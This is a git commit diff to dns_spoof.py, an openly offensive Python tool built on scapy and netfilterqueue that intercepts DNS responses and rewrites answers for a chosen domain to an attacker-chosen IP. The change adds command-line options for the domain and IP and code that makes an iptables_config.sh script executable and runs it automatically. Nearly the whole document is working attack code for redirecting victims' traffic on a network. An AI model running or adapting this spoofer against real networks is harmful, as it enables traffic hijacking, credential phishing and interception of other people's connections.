752f83f85b08efac9fb165db89925afd1072a89d
Vineeth B V <37930821+vinsdragonis@users.noreply.github.com>
2021-08-08 17:37:57 +0530

    Update dns_spoof.py

--- dns_spoof.py
+++ dns_spoof.py
@@ -3,18 +3,37 @@
 import netfilterqueue
 import scapy.all as scapy
 import subprocess
+import os
+import stat
+import argparse
 
+
+def get_range():
+    parser = argparse.ArgumentParser()
+
+    parser.add_argument("-s", "--ip", dest="ip", help="use this to set the system ip")
+    parser.add_argument("-d", "--domain", dest="domain", help="use this to set the domain url")
+    options = parser.parse_args()
+
+    if not options.ip:
+        parser.error("[-] Please specify the system's IP, use --help for more info")
+    elif not options.domain:
+        parser.error("[-] Please specify the domain url, use --help for more info")
+
+    return options
 
 
 def process_packet(packet):
+    domain = get_range().domain
+    ip_range = get_range().ip
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
         # print(scapy_packet.show())
 
         q_name = scapy_packet[scapy.DNSQR].qname
-        if "www.github.com" in q_name:
+        if domain in q_name:
             print("[+] Spoofing target ")
-            answer = scapy.DNSRR(rrname=q_name, rdata="192.168.1.5")
+            answer = scapy.DNSRR(rrname=q_name, rdata=ip_range)
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
 
@@ -28,6 +47,11 @@ def process_packet(packet):
     packet.accept()
 
 
+# This automatically compiles and executes the shell script,
+# Don't alter these lines below unless you are aware of what's happening
+
+st = os.stat('iptables_config.sh')
+os.chmod('iptables_config.sh', st.st_mode | stat.S_IEXEC)
 subprocess.call(['sh', './iptables_config.sh'])
 
 queue = netfilterqueue.NetfilterQueue()
